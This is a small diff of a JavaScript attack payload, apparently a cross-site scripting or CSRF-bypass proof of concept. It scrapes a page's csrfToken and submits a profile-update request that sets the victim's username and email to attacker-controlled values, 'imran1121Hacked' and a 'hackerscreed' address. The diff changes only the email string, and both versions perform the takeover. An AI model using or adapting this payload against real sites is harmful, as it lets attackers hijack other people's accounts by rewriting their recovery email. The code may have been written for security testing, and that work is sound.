@@ -26,7 +26,7 @@ xhttp2.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
        indx=res.search("csrfToken")
        token=res.slice(indx,indx+70).split('"')[1]
         csrf_tokenX=token;
-        xhttp2.send("username=imran1121Hacked&fname=imran&lname=parray&email=hackerscreed1121%40gmail.com&url=https%3A%2F%2Fgoogle.com&current_password=&password=&confirm_password=&__csrf_token="+csrf_tokenX+"&__fallback__=true&sec_type=undefined&sec_answer=undefined");
+        xhttp2.send("username=imran1121Hacked&fname=imran&lname=parray&email=hackerscreed1121Hacked%40gmail.com&url=https%3A%2F%2Fgoogle.com&current_password=&password=&confirm_password=&__csrf_token="+csrf_tokenX+"&__fallback__=true&sec_type=undefined&sec_answer=undefined");
 
 	    }
 	};
